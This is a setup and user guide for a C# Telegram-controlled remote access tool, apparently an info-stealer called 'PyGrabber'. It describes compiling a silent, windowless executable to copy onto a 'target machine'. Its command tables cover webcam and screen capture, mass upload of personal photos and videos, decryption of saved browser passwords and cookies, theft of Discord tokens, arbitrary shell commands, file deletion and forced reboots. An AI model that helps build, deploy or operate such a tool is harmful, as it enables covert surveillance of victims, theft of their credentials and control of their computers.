# bot_controller1 — C# Setup Guide & User Guide

Remote-control Telegram bot (C# port). Only users in the allowlisted chat IDs
can control it; everyone else gets `⛔ Access denied.`

## 1. Prerequisites

- Windows 10/11 x64
- .NET SDK 10.0.402, installed user-scope at `C:\Users\user\.dotnet`

```powershell
$env:Path = "$env:USERPROFILE\.dotnet;$env:Path"
```

(Or call the SDK by full path: `C:\Users\user\.dotnet\dotnet.exe`)

## 2. Configure bot token & chat ID

Edit `F:\.sys\PyGrabber\csharp\BotController1\Program.cs` (top of file):

```csharp
public const string BotToken = "123456:ABC-YOUR_BOT_TOKEN_HERE";
public static readonly long[] AllowedChatIds = { 123456789L };
```

- **Bot token**: Telegram → `@BotFather` → `/mybots` → *API Token*.
- **Chat ID(s)**: get yours from `@userinfobot` or `@getidsbot` in Telegram.
  Add more authorized users as extra elements: `{ 111111111L, 222222222L }`.

If the list is empty or still the placeholder `123456789`, the bot prints a
`⚠️ WARNING: No valid chat IDs configured.` startup warning and rejects
every command.

### Media limits (optional)

Same file, just below the token block:

```csharp
public const int MaxImages = 20;        // /grabpic count
public const int MaxVideos = 10;        // /grabvideos count
public const int MaxImageSizeMb = 10;   // per-image size cap
public const int MaxVideoSizeMb = 100;  // per-video size cap
```

## 3. Build & publish

```powershell
dotnet publish -c Release F:\.sys\PyGrabber\csharp\BotController1
```

Output (single self-contained exe, no .NET needed on the target machine):

```
bin\Release\net10.0-windows\win-x64\publish\bot_controller1.exe   (~87 MB)
```

- Silent: no console window (`WinExe`).
- Native DLLs (OpenCV, SQLite) are bundled and extract to temp on first use.
- Re-run publish after every token/ID change — values are compiled into the exe.

Add a package if ever needed:

```powershell
dotnet add F:\.sys\PyGrabber\csharp\BotController1 package <PackageName>
```

## 4. Run

Copy `bot_controller1.exe` to the machine, double-click it (or run it
anywhere). It starts immediately and waits for Telegram commands.
Stop it from Task Manager (no window to close).

Smoke test before shipping:

```powershell
$p = Start-Process -FilePath "...\publish\bot_controller1.exe" -PassThru
Start-Sleep -Seconds 5
if ($p.HasExited) { "EXITED code=$($p.ExitCode)" } else { "ALIVE pid=$($p.Id)"; Stop-Process -Id $p.Id -Force }
```

Expected: `ALIVE`.

---

# User Guide

Open Telegram and message your bot. Only allowlisted chat IDs work.

## Bot status

| Command | What it does |
|---|---|
| `/start` or `/help` | Show the command list |
| `/status` | System info + whether a task is running |
| `/info` | Fresh system info (OS, hostname, user, IP, CPU, RAM) |
| `/location` | Approximate location from external IP (Google Maps link) |

## Media

| Command | What it does |
|---|---|
| `/screen` or `/screenshot` | Take a screenshot and send it as a photo |
| `/webcam` | Capture one webcam photo |
| `/webcam3` | Capture 3 webcam photos (2 s apart) |
| `/grabpic` | Collect recent photos (jpg/jpeg/png/gif/bmp) from user folders and send them — up to `MaxImages`, runs in background |
| `/grabvideos` | Same for videos (mp4/avi/mov/wmv/mkv/flv) — up to `MaxVideos` |
| `/stop` | Stop the running grab task |

Notes:
- `grabpic`/`grabvideos` search Pictures, Documents, Downloads, Desktop,
  Videos (and OneDrive equivalents), newest first, skipping files over the
  size cap. Progress message every 5 files; ~1 s delay between uploads.
- Only one grab task at a time — a second one replies
  `⚠️ Another task is already running: <task>`.

## Browser data

| Command | What it does |
|---|---|
| `/passwords_chrome` | Saved Chrome passwords (decrypted) |
| `/passwords_edge` | Saved Edge passwords |
| `/passwords_brave` | Saved Brave passwords |
| `/passwords_opera` | Saved Opera passwords |
| `/cookies_chrome` | Chrome cookies |
| `/cookies_edge` | Edge cookies |
| `/cookies_brave` | Brave cookies |
| `/cookies_opera` | Opera cookies |
| `/get_discord` | Search Discord/Canary/PTB storage for tokens |

Also accepted without underscore: `/passwordschrome`, `/cookiesedge`,
`/getdiscord`, etc. Long result lists are split into multiple ~4000-char
messages automatically. Browsers that aren't installed are skipped.

## Files & shell

| Command | What it does |
|---|---|
| `/pwd` | Current working directory |
| `/ls` | List files/folders in the current directory |
| `/cd <path>` | Change directory |
| `/download <file>` | Send a file from the machine to the chat |
| `/rm_dir <path>` | Delete a folder (recursive) |
| `/cmd <command>` | Run a CMD command, send the output |
| `/open_url <url>` | Open a URL in the default browser |

The working directory starts at wherever the exe was launched from and
persists between commands.

## System control

| Command | What it does |
|---|---|
| `/kill_process <name>` | Force-kill a process by image name (e.g. `notepad.exe`) |
| `/reboot` | Restart the machine immediately |
| `/shutdown` | Shut down the machine immediately |

## Security

- Commands from any chat not in `AllowedChatIds` are ignored and answered
  with `⛔ Access denied.` (`/start` from a stranger is additionally logged
  to the console as an unauthorized access attempt).
- Anyone can talk to the bot, but only the allowlisted IDs can run anything.
- To deauthorize someone, remove their ID from `AllowedChatIds` and re-publish.
